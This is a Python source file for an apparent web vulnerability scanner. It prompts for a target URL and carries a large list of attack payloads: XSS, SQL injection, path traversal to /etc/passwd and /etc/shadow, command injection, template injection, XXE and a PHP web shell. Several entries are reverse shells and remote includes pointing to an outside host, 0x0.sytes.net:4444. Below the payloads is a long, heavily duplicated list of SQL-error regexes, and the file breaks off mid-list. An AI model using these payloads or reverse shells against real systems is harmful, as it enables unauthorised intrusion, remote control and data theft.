import logging
import tqdm
import warnings
import random
import re
import urllib3
import signal
import requests
import sys
import os
import concurrent.futures
import threading
import asyncio
import aiohttp
import ssl
import traceback
import defusedxml.ElementTree as ET
import functools
from queue import Queue
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import islice
from urllib.robotparser import RobotFileParser
from bs4 import MarkupResemblesLocatorWarning


def get_target_url():
    while True:
        user_input = input("Enter the target URL (e.g., https://example.com): ").strip()
        if not user_input:
            print("URL cannot be empty. Please try again.")
            continue

        # Ensure the URL starts with http:// or https://
        if not re.match(r"^https?://", user_input):
            print("Adding 'http://' to your URL for a proper format.")
            user_input = "http://" + user_input

        try:
            response = requests.get(user_input)
            response.raise_for_status()  # Raises an HTTPError for bad responses
            print("Successfully connected to the URL.")
            return user_input
        except requests.exceptions.MissingSchema:
            print(
                "Invalid URL format. Please include 'http://' or 'https://'. Try again."
            )
        except requests.exceptions.HTTPError as e:
            print(
                f"HTTP error {response.status_code} occurred while connecting to the URL: {str(e)}"
            )
        except requests.exceptions.ConnectionError:
            print(
                "Failed to connect to the URL. Please check your connection or the URL and try again."
            )
        except requests.exceptions.RequestException as e:
            print(f"An error occurred while connecting to the URL: {str(e)}")
        except Exception as e:
            print(f"An unexpected error occurred: {str(e)}")


PAYLOADS = [
    "<img+src%3dOnXSS+OnError%3dalert('AliElTop')>",
    "'; SELECT * FROM users; --",
    "<script>alert('AliElTop');</script>",
    "><svg/onload=prompt(/AliElTop/)>",
    "/cgi-bin/rr.cgi/https://www.google.com/",
    "<svg/onload=prompt(/AliElTop/)>",
    "../../../../../../../../../../../../../../windows/win.ini",
    ";alert(md5('AliElTop'))",
    "{% For c in [1,2,3]%} {{c,c,c}} {% endfor %}",
    "{{4*4}}[[5*5]]",
    "%26ls||id%26",
    "AliElTop",
    "gh1tpn7ip68xi45lg48197t9107rvhj6.oastify.com",
    "â€œ><script>alert(document.domain)</script>",
    ")'<!--><Svg OnLoad=(confirm)(13337777)<!--",
    ">'-(k=alert,k(13337777))-'",
    "<form><button formaction=javascript&colon;alert(13337777)",
    "-10'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z",
    "if(now()=sysdate(),sleep(20),0)",
    "${@print(md5(31337))}",
    "'(select*from(select(sleep(20)))a)'",
    "_next/image?url=",
    "'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'",
    "%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1",
    "../../../../../../../../../../../../../../etc/passwd",
    "sh -i 5<> /dev/tcp/0x0.sytes.net/4444 0<&5 1>&5 2>&5",
    "run persistence -U -i 5 -p 4444 -r 0x0.sytes.net",
    "nc 0x0.sytes.net 4444 -e /bin/sh",
    "onmouseover=alert('AliElTop')",
    "0x0.sytes.net:4444",
    "http://0x0.sytes.net:4444",
    "confirm('AliElTop')",
    "http://0x0.sytes.net/ali1.svg",
    "{{['id']|filter('system')}}",
    "javascript:alert(1)",
    ";@include('http://0x0.sytes.net/ali1.svg')",
    "javascript:eval('var a=document.createElement('script');a.src='https://js.rip/8dis0rxh46';document.body.appendChild(a)')",
    "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
    "webshell.php",
    "admin' OR '1'='1",
    "../../../../etc/passwd%00",
    "<img src=x onerror=alert('AliElTop')>",
    "<img src=x onload=alert('AliElTop')>",
    "<iframe src=x onerror=prompt(13337777)>",
    "<iframe src=x onerror=confirm(13337777)>",
    "<iframe src=x onerror=alert(13337777)>",
    "<?php system($_GET['cmd']); ?>",
    "../../../../etc/passwd",
    "%27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo",
    ";ls",
    "ls",
    "<image/src/onerror=alert('AliElTop')>",
    "<img/src/onerror=alert('AliElTop')>",
    "<image src/onerror=alert('AliElTop')>",
    "<img src/onerror=alert('AliElTop')>",
    "<image src =q onerror=alert('AliElTop')>",
    "<img src =q onerror=alert('AliElTop')>",
    "</scrip</script>t><img src =q onerror=alert('AliElTop')>",
    "..//etc/passwd",
    "../..//etc/passwd",
    "../../..//etc/passwd",
    "../../../..//etc/passwd",
    "../../../../..//etc/passwd",
    "../../../../../..//etc/passwd",
    "../../../../../../..//etc/passwd",
    "../../../../../../../..//etc/passwd",
    "..%2f/etc/passwd",
    "..%2f..%2f/etc/passwd",
    "..%2f..%2f..%2f/etc/passwd",
    "..%2f..%2f..%2f..%2f/etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f/etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
    "%2e%2e//etc/passwd",
    "%2e%2e/%2e%2e//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
    "%2e%2e%2f/etc/passwd",
    "%2e%2e%2f%2e%2e%2f/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
    "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;",
    "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;",
    "&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;",
    "/index.html|id|",
    ";id;",
    ";id",
    ";netstat -a;",
    ";system('cat%20/etc/passwd')",
    "|id",
    "|/usr/bin/id",
    "|id|",
    "|/usr/bin/id|",
    "||/usr/bin/id|",
    "|id;",
    "||/usr/bin/id;",
    ";id|",
    ";|/usr/bin/id|",
    "\n/bin/ls -al\n \n",
    "\n/usr/bin/id\n \n",
    "\nid\n \n",
    "\n/usr/bin/id;",
    "\nid;",
    "\n/usr/bin/id|",
    "\nid|",
    ";/usr/bin/id\n \n",
    ";id\n \n",
    "|usr/bin/id\n \n",
    "|nid\n \n",
    "`id`",
    "`/usr/bin/id`",
    "a);id",
    "a;id",
    "a);id;",
    "a;id;",
    "a);id|",
    "a;id|",
    "a)|id",
    "a|id",
    "a)|id;",
    "|/bin/ls -al",
    "a);/usr/bin/id",
    "a;/usr/bin/id",
    "a);/usr/bin/id;",
    "a;/usr/bin/id;",
    "a);/usr/bin/id|",
    "a;/usr/bin/id|",
    "a)|/usr/bin/id",
    "a|/usr/bin/id",
    "a)|/usr/bin/id;",
    ";system('id')",
    ";system('/usr/bin/id')",
    "%0Acat%20/etc/passwd",
    "%0A/usr/bin/id",
    "%0Aid",
    "%0A/usr/bin/id%0A",
    "%0Aid%0A",
    "| id",
    "& id",
    "; id",
    "%0a id %0a",
    "$;/usr/bin/id",
    "cat /etc/hosts",
    "$(`cat /etc/passwd`)",
    "cat /etc/passwd",
    "system('cat /etc/passwd');",
    "# from wapiti",
    "sleep(20)#",
    "1 or sleep(20)#",
    " or sleep(20)#",
    "' or sleep(20)#",
    " or sleep(20)=",
    "' or sleep(20)='",
    "1) or sleep(20)#",
    ") or sleep(20)=",
    "') or sleep(20)='",
    "1)) or sleep(20)#",
    ")) or sleep(20)=",
    "')) or sleep(20)='",
    ";waitfor delay '0:0:20'--",
    ");waitfor delay '0:0:20'--",
    "';waitfor delay '0:0:20'--",
    ";waitfor delay '0:0:20'--",
    "');waitfor delay '0:0:20'--",
    ");waitfor delay '0:0:20'--",
    "));waitfor delay '0:0:20'--",
    "'));waitfor delay '0:0:20'--",
    "));waitfor delay '0:0:20'--",
    "benchmark(10000000,MD5(20))#",
    "1 or benchmark(10000000,MD5(20))#",
    " or benchmark(10000000,MD5(20))#",
    "' or benchmark(10000000,MD5(20))#",
    "1) or benchmark(10000000,MD5(20))#",
    ") or benchmark(10000000,MD5(20))#",
    "') or benchmark(10000000,MD5(20))#",
    "1)) or benchmark(10000000,MD5(20))#",
    ")) or benchmark(10000000,MD5(20))#",
    "')) or benchmark(10000000,MD5(20))#",
    "pg_sleep(20)--",
    "1 or pg_sleep(20)--",
    " or pg_sleep(20)--",
    "' or pg_sleep(20)--",
    "1) or pg_sleep(20)--",
    ") or pg_sleep(20)--",
    "') or pg_sleep(20)--",
    "1)) or pg_sleep(20)--",
    ")) or pg_sleep(20)--",
    "')) or pg_sleep(20)--",
    "AND (SELECT * FROM (SELECT(SLEEP(20)))bAKL) AND 'vRxe'='vRxe",
    "AND (SELECT * FROM (SELECT(SLEEP(20)))YjoC) AND '%'='",
    "AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)",
    "AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)--",
    "AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)#",
    "SLEEP(20)#",
    "SLEEP(20)--",
    "SLEEP(20)=",
    "SLEEP(20)='",
    "or SLEEP(20)",
    "or SLEEP(20)#",
    "or SLEEP(20)--",
    "or SLEEP(20)=",
    "or SLEEP(20)='",
    "waitfor delay '00:00:20'",
    "waitfor delay '00:00:20'--",
    "waitfor delay '00:00:20'#",
    "benchmark(50000000,MD5(20))",
    "benchmark(50000000,MD5(20))--",
    "benchmark(50000000,MD5(20))#",
    "or benchmark(50000000,MD5(20))",
    "or benchmark(50000000,MD5(20))--",
    "or benchmark(50000000,MD5(20))#",
    "pg_SLEEP(20)",
    "pg_SLEEP(20)--",
    "pg_SLEEP(20)#",
    "or pg_SLEEP(20)",
    "or pg_SLEEP(20)--",
    "or pg_SLEEP(20)#",
    "AnD SLEEP(20)",
    "AnD SLEEP(20)--",
    "AnD SLEEP(20)#",
    "&&SLEEP(20)",
    "&&SLEEP(20)--",
    "&&SLEEP(20)#",
    "' AnD SLEEP(20) ANd '1",
    "'&&SLEEP(20)&&'1",
    "ORDER BY SLEEP(20)",
    "ORDER BY SLEEP(20)--",
    "ORDER BY SLEEP(20)#",
    "(SELECT * FROM (SELECT(SLEEP(20)))ecMj)",
    "(SELECT * FROM (SELECT(SLEEP(20)))ecMj)#",
    "(SELECT * FROM (SELECT(SLEEP(20)))ecMj)--",
    "+benchmark(3200,SHA1(20))+'",
    "+ SLEEP(20) + '",
    "RANDOMBLOB(500000000/2)",
    "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
    "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
    "RANDOMBLOB(1000000000/2)",
    "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
    "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
]

USER_AGENTS = [
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like"
        " Gecko) Chrome/91.0.4472.124 Safari/537.36"
    ),
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,"
        " like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    ),
]
ALLOWED_HOSTS = ["www.google.com"]

logging.basicConfig(level=logging.WARNING, format="%(levelname)s - %(message)s")


def print_logo():
    logo = """

███████╗░██████╗░██╗░░░██╗░██████╗░█████╗░░█████╗░███╗░░██╗
██╔════╝██╔════╝░╚██╗░██╔╝██╔════╝██╔══██╗██╔══██╗████╗░██║
█████╗░░██║░░██╗░░╚████╔╝░╚█████╗░██║░░╚═╝███████║██╔██╗██║
██╔══╝░░██║░░╚██╗░░╚██╔╝░░░╚═══██╗██║░░██╗██╔══██║██║╚████║
███████╗╚██████╔╝░░░██║░░░██████╔╝╚█████╔╝██║░░██║██║░╚███║
╚══════╝░╚═════╝░░░░╚═╝░░░╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝
    """

    print(logo)


MAX_WORKERS = 20


def check_sqli(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        response_text = response.content.decode("utf-8")

        patterns = [
            r"You have an error in your SQL syntax",
            r"mysql_fetch_array",
            r"/var/www",
            r"on line",
            r"Trying to access array offset on value of type",
            r"at line",
            r"your MySQL server version",
            r"the right syntax to",
            r"ORA-[0-9]{5}",
            r"DB2 SQL error:",
            r"pg_.*\(\):",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Unclosed quotation mark",
            r"ODBC SQL Server Driver",
            r"SQLite3::SQLException:",
            r"Syntax error or access violation:",
            r"Unexpected end of command in statement",
            r"PostgreSQL.*ERROR",
            r"javax\.persistence\.PersistenceException",
            r"ERROR: column .* does not exist",
            r"Warning: odbc_.*",
            r"Microsoft Access Driver",
            r"Syntax error in string in query expression",
            r"Microsoft JET Database Engine",
            r"Unclosed quotation mark after the character string",
            r"Microsoft SQL Native Client error",
            r"Error converting data type varchar to numeric",
            r"Conversion failed when converting the",
            r"Arithmetic overflow error",
            r"DBD::Oracle::st execute failed:",
            r"SQL Server Native Client",
            r"SQLException:",
            r"PL/SQL:.*ORA-",
            r"mysql_query\(\):",
            r"Warning: mysql_.*",
            r"Error: 0x",
            r"java\.sql\.SQLException",
            r"JDBC.*error",
            r"Invalid SQL statement or JDBC escape",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"PostgreSQL.*ERROR:",
            r"ODBC Driver Manager",
            r"SQL command not properly ended",
            r"javax\.sql\.rowset\.spi\.SyncProviderException",
            r"Invalid column name",
            r"Unknown column",
            r"Invalid object name",
            r"Unclosed quotation mark before the character string",
            r"Conversion failed when converting date and/or time",
            r"Invalid parameter binding(s)",
            r"Data type mismatch",
            r"ORA-009.*",
            r"DBD::mysql::db do failed:",
            r"SQLite error",
            r"Warning: sqlsrv_.*",
            r"sqlite3_prepare_v2",
            r"SQLSTATE\[42000\]",
            r"java\.sql\.BatchUpdateException",
            r"org\.springframework\.jdbc",
            r"MongoDB server version:",
            r"Invalid escape character",
            r"java\.sql\.SQLSyntaxErrorException",
            r"Invalid use of NULL",
            r"org\.hibernate\.QueryException",
            r"Invalid parameter number",
            r"Column count doesn't match",
            r"Warning: oci_.*",
            r"SQLSTATE\[HY000\]: General error",
            r"General error: 7 no connection to the server",
            r"Expected end of string",
            r"Unexpected character encountered while parsing",
            r"FileMaker.*Script Error",
            r"java\.lang\.IllegalArgumentException",
            r"ORA-12154",
            r"ORA-0140[12]",
            r"SQLITE_MISUSE",
            r"java\.sql\.DataTruncation",
            r"Invalid SQL statement",
            r"Error while executing SQL script",
            r"Column '.*' not found",
            r"Invalid object name '.*'",
            r"Unknown database '.*'",
            r"Table '.*' doesn't exist",
            r"ORA-125.*",
            r"Warning: mssql_.*",
            r"mysql_error",
            r"com\.microsoft\.sqlserver\.jdbc",
            r"General SQL Server error:",
            r"java\.sql\.BatchUpdateException",
            r"PLS-[0-9]{4}",
            r"SQL syntax.*MySQL",
            r"SQL Server.*Error",
            r"sqlite3_step",
            r"mysqli_.*",
            r"java\.sql\.SQLException: Invalid column index",
            r"org\.apache\.derby",
            r"mysql_num_rows",
            r"SQLSyntaxErrorException",
            r"DB2 SQL error: SQLCODE=-[0-9]+",
            r"An error occurred while parsing EntityName",
            r"java\.sql\.SQLIntegrityConstraintViolationException",
            r"SQLSTATE\[.*\]",
            r"SQL Server Native Client.*Invalid object name",
            r"An error occurred while preparing the query",
            r"Must declare the scalar variable",
            r"Invalid column reference",
            r"java\.sql\.SQLException: Column not found",
            r"java\.sql\.SQLException: No suitable driver",
            r"java\.lang\.NullPointerException",
            r"SQLSTATE\[3D000\]: Invalid catalog name",
            r"ORA-00936",
            r"SQLException: Data type mismatch",
            r"SQLSTATE\[28000\]: Invalid authorization specification",
            r"mysql_numrows",
            r"General error: 1017.*Can't find file",
            r"Error: ER_NO_SUCH_TABLE",
            r"DB2 SQL error: SQLCODE=-206",
            r"java\.lang\.IllegalStateException",
            r"Error: ER_UNKNOWN_FIELD",
            r"java\.sql\.BatchUpdateException: No more data",
            r"java\.sql\.SQLException: Invalid parameter index",
            r"Error: ER_WRONG_VALUE_COUNT",
            r"Error: ER_PARSE_ERROR",
            r"java\.lang\.OutOfMemoryError",
            r"SQLSTATE\[42000\]: Syntax error or access violation",
            r"ERROR: syntax error at or near",
            r"Error: ER_CANT_CREATE_TABLE",
            r"Warning: mysqli_.*",
            r"SQLSTATE\[42S02\]: Base table or view not found",
            r"Syntax error in INSERT INTO statement",
            r"SQLSTATE\[HYT00\]: Timeout expired",
            r"ERROR: relation \".*\" does not exist",
            r"Could not find driver",
            r"ORA-00933",
            r"java\.sql\.SQLException: No value specified for parameter",
            r"java\.sql\.SQLException: No data found",
            r"ERROR: current transaction is aborted",
            r"java\.sql\.SQLException: Data truncation",
            r"SQLSTATE\[22001\]: String data, right truncated",
            r"ERROR: invalid input syntax for type",
            r"ERROR: permission denied for relation",
            r"Column count doesn't match value count",
            r"java\.sql\.SQLException: Column count doesn't match",
            r"SQLSTATE\[08001\]: Unable to connect to database",
            r"ERROR: INSERT has more expressions",
            r"SQLSTATE\[42S22\]: Column not found",
            r"ORA-00932",
            r"SQLSTATE\[23000\]: Integrity constraint violation",
            r"Syntax error in string in query expression",
            r"java\.sql\.SQLException: Column name mismatch",
            r"SQLSTATE\[HY000\]: General error: 1025",
            r"ERROR: duplicate key value violates unique constraint",
            r"ERROR: division by zero",
            r"java\.lang\.ArrayIndexOutOfBoundsException",
            r"SQLSTATE\[08004\]: Server rejected the connection",
            r"ERROR: column .* does not exist",
            r"javax\.persistence\.TransactionRequiredException",
            r"ERROR: invalid input syntax for type numeric",
            r"Syntax error in UPDATE statement",
            r"Error: ER_DUP_ENTRY",
            r"java\.sql\.SQLException: Field '.*' doesn't have a default value",
            r"ERROR: relation \".*\" already exists",
            r"ERROR: invalid input syntax for type boolean",
            r"SQLSTATE\[22P02\]: Invalid text representation",
            r"SQLSTATE\[40001\]: Serialization failure",
            r"ERROR: operator does not exist: ",
            r"Warning: odbc_exec\(\):",
            r"java\.sql\.SQLException: ResultSet closed",
            r"SQLSTATE\[HYT00\]: Timeout expired: native",
            r"ERROR: duplicate key violates unique constraint",
            r"java\.sql\.SQLException: Invalid object name",
            r"ERROR: invalid byte sequence for encoding",
            r"ERROR: relation \".*\" does not exist",
            r"SQLSTATE\[42S12\]: Column not found",
            r"ORA-02291",
            r"Error: ER_ACCESS_DENIED_ERROR",
            r"SQLSTATE\[08006\]: No connection",
            r"java\.sql\.SQLException: ORA-02292",
            r"SQLSTATE\[23505\]: Unique constraint",
            r"ERROR: missing FROM-clause entry for table",
            r"ERROR: relation \".*\" does not exist",
            r"java\.sql\.SQLRecoverableException",
            r"java\.sql\.SQLException: Integrity constraint violation",
            r"SQLSTATE\[22018\]: Invalid character value",
            r"SQLSTATE\[08003\]: No connection",
            r"Error: ER_TABLE_EXISTS_ERROR",
            r"ORA-00001",
            r"ERROR: null value in column",
            r"ORA-01438",
            r"SQLSTATE\[42000\]: Syntax error or access violation",
            r"ERROR: duplicate key value violates unique",
            r"ERROR: unterminated quoted string",
            r"java\.sql\.SQLTimeoutException",
            r"ORA-01400",
            r"SQLSTATE\[HY000\]: General error: 2006 MySQL",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1064",
            r"java\.sql\.SQLException: Table/View '.*' does not exist",
            r"SQLSTATE\[42S02\]: Base table or view not found: 1146",
            r"ERROR: syntax error at end of input",
            r"java\.sql\.SQLException: ResultSet not open",
            r"SQLSTATE\[08001\]: [0-9]{1,10} SQLDriverConnect",
            r"ERROR: duplicate key violates unique constraint",
            r"java\.sql\.SQLException: ORA-01461",
            r"SQLSTATE\[HY000\]: General error: 1364",
            r"ERROR: column reference \".*\" is ambiguous",
            r"ORA-06512",
            r"Error: ER_BAD_FIELD_ERROR",
            r"SQLSTATE\[IM002\]: Data source name not found",
            r"java\.lang\.ArrayIndexOutOfBoundsException:",
            r"SQLSTATE\[42S12\]: Column not found: 1054",
            r"ERROR: column .* cannot be cast to type .*",
            r"ERROR: operator does not exist",
            r"java\.sql\.SQLException: ResultSet is closed",
            r"ORA-00904",
            r"ERROR: failed to find conversion function from unknown to text",
            r"ERROR: division by zero",
            r"ERROR: cannot insert multiple commands into a prepared statement",
            r"ERROR: relation \".*\" does not exist at character",
            r"java\.sql\.SQLException: ORA-02291",
            r"SQLSTATE\[HY000\]: General error: 1366",
            r"ERROR: column \".*\" does not exist",
            r"java\.lang\.NoSuchMethodError",
            r"SQLSTATE\[08006\]: No connection to the server",
            r"java\.sql\.SQLException: ORA-02292",
            r"SQLSTATE\[23502\]: Not null violation",
            r"java\.sql\.SQLException: No value specified",
            r"ERROR: relation \".*\" already exists at character",
            r"ORA-02292",
            r"SQLSTATE\[23000\]: Integrity constraint violation: 1452",
            r"ERROR: relation \".*\" already exists",
            r"SQLSTATE\[HY093\]: Invalid parameter number: no parameters",
            r"java\.sql\.SQLNonTransientConnectionException",
            r"SQLSTATE\[HY000\]: General error: 1418",
            r"ERROR: duplicate key value violates unique constraint",
            r"ERROR: column \".*\" specified more than once",
            r"java\.sql\.SQLTransientConnectionException",
            r"ERROR: value too long for type character varying",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1055",
            r"java\.sql\.SQLException: Column '.*' not found",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1142",
            r"ERROR: syntax error at or near \".*\" at character",
            r"java\.lang\.NoSuchMethodException",
            r"SQLSTATE\[22005\]: Data exception: string data",
            r"ERROR: duplicate key violates unique constraint",
            r"ERROR: column \".*\" specified more than once at character",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1067",
            r"java\.sql\.SQLFeatureNotSupportedException",
            r"ERROR: duplicate key violates unique constraint",
            r"SQLSTATE\[HY093\]: Invalid parameter number",
            r"ERROR: current transaction is aborted,",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
            r"java\.lang\.ClassCastException",
            r"ERROR: current transaction is aborted, commands",
            r"SQLSTATE\[HY000\]: General error: 1360",
            r"ERROR: column \".*\" of relation \".*\" does not exist",
            r"ERROR: duplicate key value violates unique constraint",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: column \".*\" of relation \".*\" does not exist at character",
            r"java\.sql\.SQLException: No data found",
            r"ERROR: could not open file",
            r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
            r"ERROR: unterminated quoted string at or near",
            r"java\.sql\.SQLIntegrityConstraintViolationException: Duplicate entry",
            r"SQLSTATE\[HY000\]: General error: 1021",
            r"ERROR: duplicate key violates unique constraint",
            r"java\.sql\.SQLException: No results were returned",
            r"java\.sql\.SQLException: ORA-00904",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
            r"ERROR: relation \".*\" does not exist LINE",
            r"ERROR: unterminated quoted string at or near",
            r"java\.sql\.SQLException: ORA-02291",
            r"SQLSTATE\[HY000\]: General error: 1055",
            r"ERROR: unterminated quoted string at or near \".*\" at character",
            r"java\.lang\.NoSuchFieldError",
            r"SQLSTATE\[08003\]: No connection to the server",
            r"ERROR: relation \".*\" does not exist LINE.*SQL",
            r"ERROR: unterminated quoted string at or near",
            r"java\.sql\.SQLException: Invalid object name",
            r"ERROR: relation \".*\" already exists LINE.*SQL",
            r"SQLSTATE\[HY000\]: General error: 1366",
            r"ERROR: unterminated quoted string at or near \".*\" LINE",
            r"java\.lang\.ClassNotFoundException",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: relation \".*\" does not exist at character.*LINE",
            r"ERROR: unterminated quoted string at or near \".*\" at character.*LINE",
            r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
            r"SQLSTATE\[HY000\]: General error: 2013",
            r"ERROR: unterminated quoted string at or near",
            r"java\.lang\.ClassCastException: ",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1418",
            r"ERROR: unterminated quoted string at or near \".*\" at character.*LINE",
            r"java\.lang\.IllegalAccessException",
            r"SQLSTATE\[08006\]: No connection to the server",
            r"ERROR: unterminated quoted string at or near \".*\" at character.*LINE",
            r"java\.sql\.SQLException: Invalid object name.*LINE",
            r"ERROR: column \".*\" specified more than once at character.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
            r"java\.lang\.ClassCastException:.*LINE",
            r"ERROR: duplicate key value violates unique constraint",
            r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
            r"java\.sql\.SQLException: No data found",
            r"ERROR: could not open file.*LINE",
            r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"SQLSTATE\[HY000\]: General error: 1021",
            r"ERROR: duplicate key violates unique constraint.*LINE",
            r"java\.sql\.SQLException: No results were returned",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: ORA-00904.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
            r"ERROR: relation \".*\" does not exist LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1366",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassNotFoundException",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: relation \".*\" does not exist at character.*LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
            r"SQLSTATE\[HY000\]: General error: 2013",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassCastException: ",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1418",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.IllegalAccessException",
            r"SQLSTATE\[08006\]: No connection to the server",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name.*LINE",
            r"ERROR: column \".*\" specified more than once at character.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1136",
            r"java\.lang\.ClassCastException:.*LINE",
            r"ERROR: duplicate key value violates unique constraint.*LINE",
            r"ERROR: invalid byte sequence for encoding \"UTF8\".*LINE",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: column \".*\" of relation \".*\" does not exist LINE.*SQL",
            r"java\.sql\.SQLException: No data found",
            r"ERROR: could not open file.*LINE",
            r"SQLSTATE\[22007\]: Invalid datetime format: 1292",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"SQLSTATE\[HY000\]: General error: 1021",
            r"ERROR: duplicate key violates unique constraint.*LINE",
            r"java\.sql\.SQLException: No results were returned",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: ORA-00904.*LINE",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1093",
            r"ERROR: relation \".*\" does not exist LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.sql\.SQLException: Invalid object name",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1366",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassNotFoundException",
            r"SQLSTATE\[08006\]: No connection to the server:",
            r"ERROR: relation \".*\" does not exist at character.*LINE",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.NoSuchMethodException: .*set[a-zA-Z]+",
            r"SQLSTATE\[HY000\]: General error: 2013",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.ClassCastException: ",
            r"SQLSTATE\[42000\]: Syntax error or access violation: 1109",
            r"ERROR: relation \".*\" already exists LINE",
            r"SQLSTATE\[HY000\]: General error: 1418",
            r"ERROR: unterminated quoted string at or near.*LINE",
            r"java\.lang\.IllegalAccessException",
            r"SQLSTATE\[08006\]: No connection to the server",
            r"ERROR: unterminated quoted string at or near.*LINE",
